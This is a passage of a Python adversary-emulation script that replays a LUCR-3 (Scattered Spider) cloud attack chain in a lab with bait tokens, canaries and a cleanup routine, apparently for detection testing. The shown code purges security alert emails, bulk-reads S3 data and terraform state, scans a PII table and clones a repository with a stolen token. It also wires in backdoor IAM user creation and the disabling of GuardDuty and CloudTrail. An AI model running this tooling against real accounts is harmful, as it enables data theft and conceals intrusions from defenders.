    print_step("PHASE 9 / Step 19 - T1072: Software Deployment Tools [DOCUMENTED ONLY - NO CODE]")
    print_info("=" * 60)
    print_info("TECHNIQUE: T1072 - Software Deployment Tools (SCCM / Intune)")
    print_info("REAL LUCR-3 ACTION:")
    print_info("  - Attacker gains SCCM admin via federated AD account after Okta pivot")
    print_info("  - Creates software deployment pushing payload to all domain-joined endpoints")
    print_info("  - Achieves mass lateral movement without per-host credential spray")
    print_info("EMULATION NOTE: Sandbox has no domain controller or domain-joined endpoints.")
    print_info("  Cannot emulate: SCCM may disrupt production per operational safety rules.")
    print_info("  Host access approximated by SSM session in Step 18.")
    print_info("=" * 60)

    op_delay(2, 5)

    # Step 20 - T1070.008: Clear M365 mailbox
    print_step("PHASE 9 / Step 20 - T1070.008: Clear victim M365 mailbox security alert emails")
    print_info("Tradecraft: delete security notifications to suppress victim awareness and IR")

    if graph_token:
        gh = {
            "Authorization": f"Bearer {graph_token}",
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        print_info("20.1: Search for security alert emails")
        try:
            resp = requests.get(
                "https://graph.microsoft.com/v1.0/me/messages?$filter=subject eq 'Security Alert'",
                headers=gh, timeout=30
            )
            msgs = resp.json().get("value", [])
            print_ok(f"Security alert emails found: {len(msgs)}")

            for msg in msgs[:5]:
                msg_id = msg.get("id", "")
                subj = msg.get("subject", "")
                print_info(f"  20.2: Soft-delete: {subj}")
                try:
                    mv = requests.post(
                        f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/move",
                        json={"destinationId": "deleteditems"},
                        headers=gh, timeout=30
                    )
                    if mv.status_code in (200, 201):
                        moved_id = mv.json().get("id", msg_id)
                        print_ok(f"  SoftDelete OK -> Deleted Items")
                        op_delay(1, 2)
                        print_info(f"  20.3: Hard-delete from Deleted Items")
                        hd = requests.delete(
                            f"https://graph.microsoft.com/v1.0/me/mailFolders/deleteditems/messages/{moved_id}",
                            headers=gh, timeout=30
                        )
                        if hd.status_code == 204:
                            print_ok(f"  HardDelete OK -- message purged")
                        else:
                            print_err(f"  HardDelete: HTTP {hd.status_code}")
                    else:
                        print_err(f"  SoftDelete: HTTP {mv.status_code}")
                except Exception as me:
                    print_err(f"  Message delete error: {me}")
                op_delay()
        except Exception as e:
            print_err(f"Mailbox search failed: {e}")
    else:
        print_err("No Graph token -- M365 mailbox cleanup skipped")


# ============================================================
# PHASE 10 -- Bulk Exfiltration
# ============================================================

def phase10_exfiltration(attacker_sess, s3_corporate_bucket, s3_engineering_bucket,
                          dynamodb_table, github_pat, github_owner, github_repo):
    """
    Steps 21, 22 - T1530, T1213.003: Exfiltrate S3/DynamoDB; clone GitHub repo.
    Returns (clone_dir, clone_success).
    """
    region = attacker_sess.region_name or "us-east-1"
    s3  = attacker_sess.client("s3",      region_name=region)
    ddb = attacker_sess.client("dynamodb", region_name=region)

    # Step 21 - T1530
    print_step("PHASE 10 / Step 21 - T1530: Bulk S3 and DynamoDB exfiltration")
    print_info("Tradecraft: equivalent to LUCR-3 S3 Browser 10.9.9 / CloudShell bulk GetObject")
    print_info("CloudTrail is stopped -- S3 server access logs remain active independently")

    seen_pairs = set()
    exfil_queue = []

    for bkt in [s3_corporate_bucket, s3_engineering_bucket]:
        if not bkt:
            continue
        try:
            objs = s3.list_objects_v2(Bucket=bkt).get("Contents", [])
            print_ok(f"ListObjects({bkt}): {len(objs)} objects")
            for o in objs[:20]:
                exfil_queue.append((bkt, o["Key"]))
        except ClientError as e:
            print_err(f"ListObjects({bkt}): {e}")
        op_delay()

    # Add known high-value keys
    for bkt, key in [
        (s3_corporate_bucket, "sensitive-data.txt"),
        (s3_engineering_bucket, "terraform.tfstate"),
        (s3_engineering_bucket, "terraform/prod/terraform.tfstate"),
    ]:
        if bkt and key:
            exfil_queue.append((bkt, key))

    for bkt, key in exfil_queue:
        if not bkt or not key:
            continue
        pair = (bkt, key)
        if pair in seen_pairs:
            continue
        seen_pairs.add(pair)
        try:
            obj = s3.get_object(Bucket=bkt, Key=key)
            data = obj["Body"].read(4096)
            print_ok(f"GetObject({bkt}/{key}): {len(data)} bytes")
            if "bait" in bkt.lower() or "bait" in key.lower() or "terraform" in key.lower():
                print_info("  CANARY: bait object accessed -- independent canary alert triggered")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchKey", "NoSuchBucket", "AccessDenied"):
                print_err(f"GetObject({bkt}/{key}): {code}")
            else:
                print_err(f"GetObject({bkt}/{key}): {e}")
        op_delay()

    op_delay(3, 10)

    if dynamodb_table:
        print_info(f"DynamoDB Scan({dynamodb_table}) -- PII enumeration")
        try:
            resp = ddb.scan(TableName=dynamodb_table, Limit=100)
            items = resp.get("Items", [])
            print_ok(f"DynamoDB Scan: {len(items)} records")
            if items:
                print_info(f"  Sample keys: {list(items[0].keys())}")
        except ClientError as e:
            print_err(f"DynamoDB Scan: {e}")

    op_delay(3, 10)

    # Step 22 - T1213.003: GitHub repo clone
    print_step("PHASE 10 / Step 22 - T1213.003: Clone target GitHub repository")
    print_info(f"Target: {github_owner}/{github_repo}")
    print_info("Tradecraft: source code exfiltration for embedded secrets and proprietary IP")
    print_info("NOTE: bait PAT is revoked -- 401 expected; attempt still generates GitHub Audit Log event")

    clone_dir = "/tmp/lucr3-repo"
    clone_success = False

    if github_pat and github_owner and github_repo:
        gh_hdrs = {
            "Authorization": f"Bearer {github_pat}",
            "Accept": "application/vnd.github+json",
        }

        # 22.1: Verify repo access
        print_info(f"22.1: GET /repos/{github_owner}/{github_repo}")
        try:
            resp = requests.get(
                f"https://api.github.com/repos/{github_owner}/{github_repo}",
                headers=gh_hdrs, timeout=30
            )
            if resp.status_code == 200:
                print_ok(f"Repo accessible: {resp.json().get('full_name')}")
            else:
                print_err(f"Repo access: HTTP {resp.status_code} (expected on revoked bait token)")
        except Exception as e:
            print_err(f"Repo access check: {e}")

        op_delay()

        # 22.2: Enumerate contents
        print_info("22.2: GET /repos/.../contents")
        try:
            resp = requests.get(
                f"https://api.github.com/repos/{github_owner}/{github_repo}/contents",
                headers=gh_hdrs, timeout=30
            )
            if resp.status_code == 200:
                contents = resp.json()
                print_ok(f"Repo contents: {len(contents)} items")
                for item in contents[:10]:
                    print_info(f"  {item.get('type')}: {item.get('name')}")
            else:
                print_err(f"Contents: HTTP {resp.status_code}")
        except Exception as e:
            print_err(f"Contents enumeration: {e}")

        op_delay()

        # 22.3: git clone
        print_info(f"22.3: git clone https://***@github.com/{github_owner}/{github_repo}")
        clone_url = f"https://{github_pat}@github.com/{github_owner}/{github_repo}"
        try:
            if os.path.exists(clone_dir):
                shutil.rmtree(clone_dir)
            result = subprocess.run(
                ["git", "clone", clone_url, clone_dir],
                capture_output=True, text=True, timeout=120
            )
            if result.returncode == 0:
                print_ok(f"git clone succeeded -> {clone_dir}")
                clone_success = True
            else:
                print_err(f"git clone failed (rc={result.returncode}): {result.stderr.strip()[:200]}")
                print_info("Expected on revoked bait token -- attempt generates GitHub Audit Log event")
        except FileNotFoundError:
            print_err("git not found in PATH -- clone skipped")
        except Exception as e:
            print_err(f"git clone error: {e}")
    else:
        print_err("GitHub PAT / owner / repo not available -- Step 22 skipped")

    return clone_dir, clone_success


# ============================================================
# POST-ATTACK CLEANUP
# Cleanup order per cleanup_manifest:
# 1. Re-enable GuardDuty (FIRST -- restore visibility)
# 2. Re-enable CloudTrail (SECOND)
# 3. Remove attacker Okta TOTP factor
# 4. Delete IAM access key(s) on backdoor user
# 5. Detach AdministratorAccess from backdoor user
# 6. Delete IAM login profile
# 7. Delete IAM user
# 8. Terminate attacker EC2 instance
# 9. Delete IAM instance profile
# 10. Delete local repo clone
# ============================================================

def post_attack_cleanup(
    cleanup_sess,
    okta_domain, okta_user_id, enrolled_factor_id,
    backdoor_username, attacker_key_id,
    detector_id, trail_name,
    launched_ec2_id, instance_profile_name,
    clone_dir,
):
    print_step("=" * 60)
    print_step("POST-ATTACK CLEANUP -- restoring lab environment")
    print_step("=" * 60)

    region = cleanup_sess.region_name or "us-east-1"
    gd  = cleanup_sess.client("guardduty",  region_name=region)
    ct  = cleanup_sess.client("cloudtrail", region_name=region)
    iam = cleanup_sess.client("iam",         region_name=region)
    ec2 = cleanup_sess.client("ec2",         region_name=region)

    # 1. Re-enable GuardDuty FIRST
    print_step("Cleanup 1/10: Re-enable GuardDuty")
    if detector_id:
        try:
            gd.update_detector(DetectorId=detector_id, Enable=True)
            print_ok(f"GuardDuty {detector_id} re-enabled")
        except ClientError as e:
            print_err(f"Re-enable GuardDuty: {e}")
    else:
        print_err("detector_id unknown -- GuardDuty re-enable skipped")

    op_delay(1, 3)

    # 2. Re-enable CloudTrail
    print_step("Cleanup 2/10: Re-enable CloudTrail")
    if trail_name:
        try:
            ct.start_logging(Name=trail_name)
            print_ok(f"StartLogging({trail_name}) -- CloudTrail resumed")
        except ClientError as e:
            print_err(f"StartLogging: {e}")
    else:
        print_err("trail_name unknown -- CloudTrail re-enable skipped")

    op_delay(1, 3)

    # 3. Remove attacker Okta TOTP factor
    print_step("Cleanup 3/10: Remove attacker TOTP factor from Okta")
    if okta_domain and okta_user_id and enrolled_factor_id:
        okta_api_token = os.environ.get("OKTA_API_TOKEN", "")
        hdrs = {"Content-Type": "application/json", "Accept": "application/json"}
        if okta_api_token:
            hdrs["Authorization"] = f"SSWS {okta_api_token}"
        try:
            resp = requests.delete(
                f"https://{okta_domain}/api/v1/users/{okta_user_id}/factors/{enrolled_factor_id}",
                headers=hdrs, timeout=30
            )
            if resp.status_code == 204:
                print_ok(f"Okta factor {enrolled_factor_id} deleted")
            else:
                print_err(f"Factor delete: HTTP {resp.status_code} / {resp.text[:100]}")
        except Exception as e:
            print_err(f"Okta factor delete: {e}")
    else:
        print_err("Okta cleanup info missing -- factor removal skipped (manual action needed)")

    op_delay(1, 3)

    # 4. Delete all access keys on backdoor user
    print_step(f"Cleanup 4/10: Delete IAM access keys for {backdoor_username}")
    if backdoor_username:
        try:
            all_keys = iam.list_access_keys(UserName=backdoor_username)["AccessKeyMetadata"]
            for k in all_keys:
                iam.delete_access_key(UserName=backdoor_username, AccessKeyId=k["AccessKeyId"])
                print_ok(f"DeleteAccessKey: {k['AccessKeyId']}")
        except ClientError as e:
            print_err(f"DeleteAccessKey cleanup: {e}")

    op_delay(1, 3)

    # 5. Detach AdministratorAccess
    print_step(f"Cleanup 5/10: Detach AdministratorAccess from {backdoor_username}")
    if backdoor_username:
        try:
            iam.detach_user_policy(
                UserName=backdoor_username,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
            )
            print_ok("DetachUserPolicy: AdministratorAccess")
        except ClientError as e:
            if "NoSuchEntity" in str(e):
                print_ok("Policy already detached")
            else:
                print_err(f"DetachUserPolicy: {e}")

    op_delay(1, 3)

    # 6. Delete login profile
    print_step(f"Cleanup 6/10: Delete IAM login profile for {backdoor_username}")
    if backdoor_username:
        try:
            iam.delete_login_profile(UserName=backdoor_username)
            print_ok(f"DeleteLoginProfile: {backdoor_username}")
        except ClientError as e:
            if "NoSuchEntity" in str(e):
                print_ok("Login profile already deleted")
            else:
                print_err(f"DeleteLoginProfile: {e}")

    op_delay(1, 3)

    # 7. Delete IAM user (enumerate all keys first to avoid DeleteConflict)
    print_step(f"Cleanup 7/10: Delete IAM user {backdoor_username}")
    if backdoor_username:
        try:
            remaining = iam.list_access_keys(UserName=backdoor_username)["AccessKeyMetadata"]
            for k in remaining:
                iam.delete_access_key(UserName=backdoor_username, AccessKeyId=k["AccessKeyId"])
        except ClientError:
            pass
        try:
            iam.delete_user(UserName=backdoor_username)
            print_ok(f"DeleteUser: {backdoor_username}")
        except ClientError as e:
            print_err(f"DeleteUser: {e}")

    op_delay(1, 3)

    # 8. Terminate attacker EC2 instance
    print_step("Cleanup 8/10: Terminate attacker EC2 instance")
    if launched_ec2_id:
        try:
            ec2.terminate_instances(InstanceIds=[launched_ec2_id])
            print_ok(f"TerminateInstances: {launched_ec2_id}")
        except ClientError as e:
            print_err(f"TerminateInstances: {e}")
    else:
        print_err("No launched EC2 id -- termination skipped")

    op_delay(5, 15)

    # 9. Delete IAM instance profile
    print_step(f"Cleanup 9/10: Delete IAM instance profile {instance_profile_name}")
    if instance_profile_name:
        try:
            iam.delete_instance_profile(InstanceProfileName=instance_profile_name)
            print_ok(f"DeleteInstanceProfile: {instance_profile_name}")
        except ClientError as e:
            if "NoSuchEntity" in str(e):
                print_ok("Instance profile already deleted")
            else:
                print_err(f"DeleteInstanceProfile: {e}")

    op_delay(1, 3)

    # 10. Delete local repo clone
    print_step("Cleanup 10/10: Delete local repo clone")
    if clone_dir and os.path.exists(clone_dir):
        try:
            shutil.rmtree(clone_dir)
            print_ok(f"Deleted: {clone_dir}")
        except Exception as e:
            print_err(f"rmtree {clone_dir}: {e}")
    else:
        print_info("No local clone to delete")

    print_ok("Post-attack cleanup complete")
    print_info("Remaining: run 'pulumi destroy' in infra/ to remove all Pulumi-managed infra")


# ============================================================
# SUMMARY
# ============================================================

def print_summary(events):
    print("\n" + "=" * 60)
    print("LUCR-3 EMULATION COMPLETE")
    print("=" * 60)
    print("\nAudit Events / CloudTrail API Calls Generated:")
    for e in events:
        print(f"  [+] {e}")
    print("\nPhases:     10")
    print("Steps:      22 (Steps 3 and 19 are documented-only stubs)")
    print("Techniques: T1078.004, T1621, T1111, T1098.005, T1213.002,")
    print("            T1580, T1619, T1082, T1136.003, T1098, T1098.001,")
    print("            T1555.006, T1578.002, T1550.001, T1562.001, T1562.008,")
    print("            T1021.004, T1072, T1070.008, T1530, T1213.003")
    print("=" * 60)


# ============================================================
# BACKEND ENTRY POINT
# ============================================================

def run(outputs: dict, region: str = "us-east-1") -> None:
    """MayaTrail backend entry point. `outputs` is the Pulumi stack output dict."""
    print("=" * 60)
    print("LUCR-3 (Scattered Spider) Adversary Emulation")
    print("10-phase / 22-step attack chain")
    print(f"Region: {region}")
    print("=" * 60)

    # Resolve all resource names from Pulumi outputs (infra = outputs dict)
    infra = outputs

    def resolve(key, env_var, default=""):
        return infra.get(key, "") or os.environ.get(env_var, default)

    # Keys must match pulumi.export() keys in infra/__main__.py exactly.
    okta_domain          = resolve("okta_org_url",            "OKTA_DOMAIN")
    okta_aws_app_id      = resolve("okta_aws_app_id",         "OKTA_AWS_APP_ID")
    okta_azuread_app_id  = resolve("azuread_app_client_id",   "OKTA_AZUREAD_APP_ID")
    m365_tenant_id       = resolve("m365_tenant_id",          "M365_TENANT_ID")
    federated_role_arn   = resolve("federated_role_arn",      "FEDERATED_ROLE_ARN")
    saml_provider_arn    = resolve("saml_provider_arn",       "SAML_PROVIDER_ARN")
    trail_name           = resolve("trail_name",              "TRAIL_NAME",             "lucr3-cloudtrail")
    subnet_id            = resolve("subnet_id",               "LUCR3_SUBNET_ID")
    sg_id                = resolve("ec2_sg_id",               "LUCR3_SG_ID")
    ec2_target_id        = resolve("ec2_instance_id",         "LUCR3_EC2_TARGET_ID")
    s3_corporate_bucket  = resolve("corporate_bucket_name",   "CORPORATE_BUCKET_NAME")
    s3_engineering_bucket= resolve("engineering_bucket_name", "ENGINEERING_BUCKET_NAME")
    dynamodb_table       = resolve("dynamodb_table_name",     "DYNAMODB_TABLE_NAME",    "lucr3-CustomerRecords")
    github_owner         = resolve("github_owner",            "GITHUB_OWNER")
    github_repo          = resolve("github_repo_name",        "GITHUB_REPO_NAME",       "lucr3-core-platform")
    backdoor_username    = resolve("attacker_user_name",      "ATTACKER_USER_NAME",     "svc-automation-lucr3")
    aws_region           = region or resolve("aws_region",    "AWS_DEFAULT_REGION",     "us-east-1")

    okta_username = os.environ.get("OKTA_VICTIM_USERNAME", "")
    okta_password = os.environ.get("OKTA_VICTIM_PASSWORD", "")

    if not okta_username or not okta_password:
        print_err("FATAL: OKTA_VICTIM_USERNAME and OKTA_VICTIM_PASSWORD must be set")
        sys.exit(1)
    if not okta_domain:
        print_err("FATAL: OKTA_DOMAIN must be set (or exported from Pulumi as okta_org_url)")
        sys.exit(1)

    print_ok(f"Okta domain:        {okta_domain}")
    print_ok(f"Federated role:     {federated_role_arn}")
    print_ok(f"CloudTrail trail:   {trail_name}")
    print_ok(f"Backdoor user:      {backdoor_username}")
    print_ok(f"AWS region:         {aws_region}")

    # State tracking
    okta_session_id       = None
    okta_user_id          = None
    enrolled_factor_id    = None
    saml_session          = None
    attacker_session      = None
    attacker_key_id       = None
    attacker_secret       = None
    graph_token           = None
    github_pat            = ""
    detector_id           = None
    launched_ec2_id       = None
    instance_profile_name = None
    clone_dir             = "/tmp/lucr3-repo"
    clone_success         = False
    events                = []

    # ============================================================
    # PHASE 1
    # ============================================================
    result = phase1_okta_authn(okta_domain, okta_username, okta_password)
    state_token, factor_id = result

    if state_token == "DIRECT":
        # No MFA -- factor_id holds the sessionToken
        session_token = factor_id
        events.append("user.session.start (Okta System Log) -- no MFA required")
    elif state_token and factor_id:
        events.append("user.session.start (Okta System Log)")
        session_token = phase1_mfa_fatigue_and_intercept(okta_domain, state_token, factor_id)
        if session_token:
            events.append("user.authentication.auth_via_mfa (Okta System Log)")
    else:
        print_err("Phase 1 authentication failed -- aborting")
        sys.exit(1)

    phase_delay()

    # ============================================================
    # PHASE 2
    # ============================================================
    if session_token:
        okta_session_id, okta_user_id, enrolled_factor_id, _ = \
            phase2_enroll_attacker_device(okta_domain, session_token)
        if enrolled_factor_id:
            events.append("user.mfa.factor.activate (Okta System Log)")
    else:
        print_err("No sessionToken -- Phase 2 skipped")

    phase_delay()

    # ============================================================
    # PHASE 3
    # ============================================================
    if okta_session_id and federated_role_arn and saml_provider_arn:
        key_id, secret, token = phase3_saml_pivot_aws(
            okta_domain, okta_session_id, okta_aws_app_id,
            federated_role_arn, saml_provider_arn
        )
        if key_id:
            saml_session = make_aws_session(key_id, secret, token, region=aws_region)
            events.append("AssumeRoleWithSAML (sts.amazonaws.com)")
    else:
        print_err("Phase 3 prerequisites missing -- SAML pivot skipped")

    phase_delay()

    # ============================================================
    # PHASE 4
    # ============================================================
    if okta_session_id and okta_azuread_app_id and m365_tenant_id:
        graph_token = phase4_m365_sharepoint(
            okta_domain, okta_session_id, okta_azuread_app_id, m365_tenant_id
        )
        if graph_token:
            events.append("FileAccessed (M365 Unified Audit Log)")
            events.append("SearchQueryPerformed (M365 Unified Audit Log)")
    else:
        print_err("Phase 4 prerequisites missing -- M365 collection skipped")

    phase_delay()

    # ============================================================
    # PHASE 5
    # ============================================================
    if saml_session:
        ssm_ids = phase5_aws_discovery(saml_session, s3_corporate_bucket, s3_engineering_bucket)
        events += [
            "GetCallerIdentity (sts.amazonaws.com)",
            "ListUsers (iam.amazonaws.com)",
            "ListRoles (iam.amazonaws.com)",
            "DescribeInstances (ec2.amazonaws.com)",
            "ListTables (dynamodb.amazonaws.com)",
            "ListBuckets (s3.amazonaws.com)",
            "ListObjects (s3.amazonaws.com)",
            "DescribeVpcs (ec2.amazonaws.com)",
            "DescribeSubnets (ec2.amazonaws.com)",
            "DescribeKeyPairs (ec2.amazonaws.com)",
            "DescribeInstanceInformation (ssm.amazonaws.com)",
        ]
        if not ec2_target_id and ssm_ids:
            ec2_target_id = ssm_ids[0]
            print_info(f"Using SSM-discovered EC2 target: {ec2_target_id}")
    else:
        print_err("No SAML session -- Phase 5 skipped")

    phase_delay()

    # ============================================================
    # PHASE 6
    # ============================================================
    if saml_session:
        attacker_key_id, attacker_secret = phase6_aws_backdoor(saml_session, backdoor_username)
        if attacker_key_id:
            attacker_session = make_aws_session(
                attacker_key_id, attacker_secret, region=aws_region
            )
            print_ok(f"Attacker IAM session established (phase8_attacker_iam_key: {attacker_key_id})")
            events += [
                "CreateUser (iam.amazonaws.com)",
                "CreateLoginProfile (iam.amazonaws.com)",
                "AttachUserPolicy AdministratorAccess (iam.amazonaws.com)",
                "CreateAccessKey (iam.amazonaws.com)",
            ]
    else:
        print_err("No SAML session -- Phase 6 skipped")

    phase_delay()

    # ============================================================
    # PHASE 7
    # ============================================================
    if attacker_session:
        github_pat, launched_ec2_id, instance_profile_name = \
            phase7_harvest_and_stage(attacker_session, subnet_id, sg_id)
        events += [
            "ListSecrets (secretsmanager.amazonaws.com)",
            "GetSecretValue prod/database/master_credentials (secretsmanager.amazonaws.com)",
            "GetSecretValue prod/payments/stripe_secret_key (secretsmanager.amazonaws.com)",
            "GetSecretValue prod/infrastructure/terraform-automation-key CANARY TRIGGERED",
            "GetSecretValue prod/cicd/github-actions-token CANARY TRIGGERED",
            "CreateInstanceProfile (iam.amazonaws.com)",
            "RunInstances (ec2.amazonaws.com)",
        ]
    else:
        print_err("No attacker session -- Phase 7 skipped")

    phase_delay()

    # ============================================================
    # PHASE 8
    # ============================================================
    if attacker_session:
        detector_id = phase8_defense_evasion(attacker_session, github_pat, trail_name)
        events += [
            "GitHub API token use attempt (GitHub Audit Log) -- canary triggered",
            "UpdateDetector Enable=False (guardduty.amazonaws.com)",
            "StopLogging (cloudtrail.amazonaws.com) -- LAST EVENT BEFORE GAP",
        ]
    else:
        print_err("No attacker session -- Phase 8 skipped")

    phase_delay()

    # ============================================================
    # PHASE 9
    # ============================================================
    if attacker_session:
        phase9_lateral_and_cleanup(attacker_session, ec2_target_id, graph_token)
        events += [
            "StartSession SSM (ssm.amazonaws.com) -- lateral movement",
            "HardDelete security alert emails (M365 Unified Audit Log)",
            "SoftDelete security alert emails (M365 Unified Audit Log)",
        ]
    else:
        print_err("No attacker session -- Phase 9 skipped")

    phase_delay()

    # ============================================================
    # PHASE 10
    # ============================================================
    if attacker_session:
        clone_dir, clone_success = phase10_exfiltration(
            attacker_session,
            s3_corporate_bucket, s3_engineering_bucket, dynamodb_table,
            github_pat, github_owner, github_repo,
        )
        events += [
            "GetObject s3-corporate-data (S3 server access log)",
            "GetObject s3-engineering-artifacts (S3 server access log)",
            "GetObject lucr3-bait-terraform-state CANARY TRIGGERED",
            "DynamoDB Scan lucr3-CustomerRecords",
            "GitHub git.clone attempt (GitHub Audit Log)",
        ]
    else:
        print_err("No attacker session -- Phase 10 skipped")

    phase_delay()

    # ============================================================
    # CLEANUP -- uses attacker_session (has AdministratorAccess)
    # Falls back to saml_session if attacker key was never created
    # ============================================================
    cleanup_sess = attacker_session or saml_session
    if cleanup_sess:
        post_attack_cleanup(
            cleanup_sess,
            okta_domain, okta_user_id, enrolled_factor_id,
            backdoor_username, attacker_key_id,
            detector_id, trail_name,
            launched_ec2_id, instance_profile_name,
            clone_dir,
        )
    else:
        print_err("No cleanup session -- manual cleanup required")
        print_info("Manual steps: pulumi destroy in infra/")

    print_summary(events)


if __name__ == "__main__":
    _outputs = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {}
    _region  = sys.argv[2] if len(sys.argv) > 2 else "us-east-1"
    run(_outputs, _region)
